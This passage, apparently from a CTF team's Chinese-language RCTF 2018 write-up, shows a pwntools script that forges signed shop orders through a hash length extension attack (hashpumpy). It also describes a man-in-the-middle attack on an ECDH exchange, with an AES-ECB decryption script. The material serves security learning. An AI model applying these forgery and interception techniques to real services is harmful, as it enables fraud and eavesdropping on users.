class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"></span><br><span class="line">s=remote(<span class="string">'cpushop.2018.teamrois.cn'</span>,<span class="number">43000</span>)</span><br><span class="line">s.recvuntil(<span class="string">'Command:'</span>)</span><br><span class="line">s.sendline(<span class="string">'1'</span>)</span><br><span class="line">s.recvuntil(<span class="string">'Command:'</span>)</span><br><span class="line">s.sendline(<span class="string">'2'</span>)</span><br><span class="line">s.recvuntil(<span class="string">'Product ID:'</span>)</span><br><span class="line">s.sendline(<span class="string">'9'</span>)</span><br><span class="line">s.recvuntil(<span class="string">'Your order:'</span>)</span><br><span class="line">s.recvline()</span><br><span class="line">a=s.recvline()</span><br><span class="line">timestamp=a[<span class="number">35</span>:<span class="number">51</span>]</span><br><span class="line">sign=a[<span class="number">57</span>:<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">print</span> a</span><br><span class="line"><span class="keyword">print</span> timestamp</span><br><span class="line"><span class="keyword">print</span> sign,len(sign)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>,<span class="number">32</span>):</span><br><span class="line">hax=hashpumpy.hashpump(sign,<span class="string">'product=Flag&amp;price=99999&amp;timestamp='</span>+timestamp,<span class="string">'&amp;product=Flag&amp;price=9&amp;timestamp='</span>+timestamp,i)</span><br><span class="line"><span class="comment">#print hax</span></span><br><span class="line">payload=hax[<span class="number">1</span>]+<span class="string">'&amp;sign='</span>+hax[<span class="number">0</span>]</span><br><span class="line"><span class="comment">#print payload</span></span><br><span class="line">s.recvuntil(<span class="string">'Command:'</span>)</span><br><span class="line">s.sendline(<span class="string">'3'</span>)</span><br><span class="line">s.recvuntil(<span class="string">'Your order:'</span>)</span><br><span class="line">s.sendline(payload)</span><br><span class="line">pp=s.recvline()</span><br><span class="line"><span class="keyword">print</span> pp</span><br><span class="line"><span class="keyword">if</span> <span class="string">"Order"</span> <span class="keyword">not</span> <span class="keyword">in</span> pp:</span><br><span class="line">s.interactive()</span><br><span class="line"></span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure></p><h3><span id="ecdh"><strong>ECDH</strong></span></h3><p>查阅资料得到：<a href="https://github.com/esxgx/easy-ecc" class="uri" target="_blank" rel="noopener">https://github.com/esxgx/easy-ecc</a></p><p>和几个关键字：ECDH、secp128r1、AES、ECB</p><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/76b9dcf63ead383913bcb280a9b3847e.png?raw=true"></p><p>github项目有4个函数：生成密钥、计算共享密钥、签名、验证签名</p><p>首先要问Alice和bob的公钥，然后交换给对方，Alice才会说出密文，Bob只会把密文告诉Alice</p><p>大概就是用中间人攻击获取明文</p><p>emm。。现在会生成密钥对了，但是不知道怎么解密。。</p><p>使用自己的私钥和Bob的公钥生成的共享密钥 解 Alice发出的密文：失败（其实是可以成功，就是要自己写脚本）</p><p><strong>过程：</strong></p><p>生成自己的密钥对</p><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/c51aad457fccc3f3a1b1a2c90971439b.png?raw=true"></p><p>找bob要pubkey，顺便把自己的pubkey作为alice的pubkey给bob</p><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/11d96a67c04fd1acf7a343af01029103.png?raw=true"></p><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/324b64fa098f1f7943a1cca08b6d02a2.png?raw=true"></p><p>结合自己的prikey和bob的pubkey生成shared_key</p><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/46c909aa1290c107b4896dc543c16b0b.png?raw=true"></p><p>找bob把flag发给alice，再去alice那边接收密文</p><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/ec2c093149a70879bef86bc16c80fcae.png?raw=true"></p><p>用shared_key作为密钥，用AES的ECB模式解密Alice给的密文</p><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/ed0487584190c201a1c8237910eaa95e.png?raw=true"> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># aes_decrypt.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex, a2b_hex</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AESCrypto</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,key)</span>:</span></span><br><span class="line">        self.key = key</span><br><span class="line">        self.mode = AES.MODE_ECB</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(self,text)</span>:</span></span><br><span class="line">        cryptor = AES.new(self.key,self.mode,<span class="string">b'0000000000000000'</span>)</span><br><span class="line">        plain_text  = cryptor.decrypt(a2b_hex(text))</span><br><span class="line">        <span class="keyword">return</span> plain_text</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    p_secret = <span class="string">'841747f83b3367c2331069ef167d0179'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"key:       "</span>,p_secret</span><br><span class="line">    pc = AESCrypto(a2b_hex(p_secret))</span><br><span class="line">    e = <span class="string">'1d6002b9d8d721039c602a8c46fb4e2ea96d1bacf28e3c41635ea493df02f80e'</span></span><br><span class="line">    d = pc.decrypt(e)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"ciphertext:"</span>,e</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"decrypt:   "</span>,d</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;de1ta-team&quot;&gt;&lt;strong&gt;De1ta-Team&lt;/strong&gt;&lt;/h1&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://blog.de1ta.com/tags/ctf/"/>
    
      <category term="re" scheme="https://blog.de1ta.com/tags/re/"/>
    
      <category term="web" scheme="https://blog.de1ta.com/tags/web/"/>
    
      <category term="crypto" scheme="https://blog.de1ta.com/tags/crypto/"/>
    
      <category term="pwn" scheme="https://blog.de1ta.com/tags/pwn/"/>
    
      <category term="misc" scheme="https://blog.de1ta.com/tags/misc/"/>
    
      <category term="writeup" scheme="https://blog.de1ta.com/tags/writeup/"/>
    
      <category term="rctf" scheme="https://blog.de1ta.com/tags/rctf/"/>
    
  </entry>
  
</feed>
